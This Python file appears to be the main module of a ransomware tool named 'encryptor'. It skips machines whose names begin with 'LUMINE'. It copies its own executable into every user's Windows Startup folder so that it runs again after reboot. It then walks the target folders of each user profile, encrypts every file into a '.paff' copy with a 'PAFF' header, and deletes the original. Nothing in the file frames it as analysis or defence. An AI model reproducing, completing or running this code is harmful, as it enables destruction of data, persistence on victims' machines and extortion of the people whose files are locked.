import os
import sys
from encryptor.cipher import encrypt
from encryptor.context import SECRET_PATH, TARGET
from encryptor.vars import Global
from encryptor.utils import get_all_user_profiles


def main():
    # 安全起见，获取计算机名称
    PC_NAME = os.getenv("COMPUTERNAME", "UnknownPC")
    if PC_NAME.startswith("LUMINE"):
        return
    current_executable_path = sys.executable
    executable_name = os.path.basename(current_executable_path)

    # 找到的所有用户
    all_users = get_all_user_profiles()
    print(f"[*] Found user profiles: {all_users}")

    for username in all_users:
        try:
            user_profile = os.path.join(
                os.getenv("SystemDrive", "C:"), r"\Users", username
            )
            startup_path = os.path.join(
                user_profile,
                r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
            )
            destination_path = os.path.join(startup_path, executable_name)

            if not os.path.exists(destination_path):
                os.makedirs(startup_path, exist_ok=True)
                with open(current_executable_path, "rb") as src_file:
                    with open(destination_path, "wb") as dst_file:
                        dst_file.write(src_file.read())
        except Exception:
            continue

    for username in all_users:
        print(f"\n[+] Now targeting user: {username}")

        try:
            user_profile_path = os.path.join(
                os.getenv("SystemDrive", "C:"), r"\Users", username
            )
            user_appdata_path = os.path.join(user_profile_path, "AppData", "Roaming")
            user_secret_path = SECRET_PATH.replace("%APPDATA%", user_appdata_path)

            print(f"[*] Initializing key for user '{username}' at: {user_secret_path}")
            PARAMS_FOR_THIS_USER = Global(user_secret_path)

            for target_template in TARGET:
                processed_path = target_template.replace("%USERNAME%", username)
                processed_path = processed_path.replace("%APPDATA%", user_appdata_path)
                processed_path = processed_path.replace(
                    "%USERPROFILE%", user_profile_path
                )

                print(f"[*] Scanning target folder: {processed_path}")

                if not os.path.exists(processed_path):
                    continue

                for root, _, files in os.walk(processed_path):
                    for file in files:
                        if file.endswith(".paff"):
                            continue

                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, "rb") as f:
                                data = f.read()

                            if not data or data.startswith(b"PAFF"):
                                continue

                            encrypted_data = encrypt(data, PARAMS_FOR_THIS_USER)

                            with open(file_path + ".paff", "wb") as f:
                                f.write(b"PAFF" + encrypted_data)

                            os.remove(file_path)

                        except Exception as e:
                            print(
                                f"[-] Failed to process file: {file_path} with error: {e}"
                            )

        except Exception as e:
            print(
                f"[!] A critical error occurred while processing user '{username}': {e}"
            )
            continue


if __name__ == "__main__":
    main()
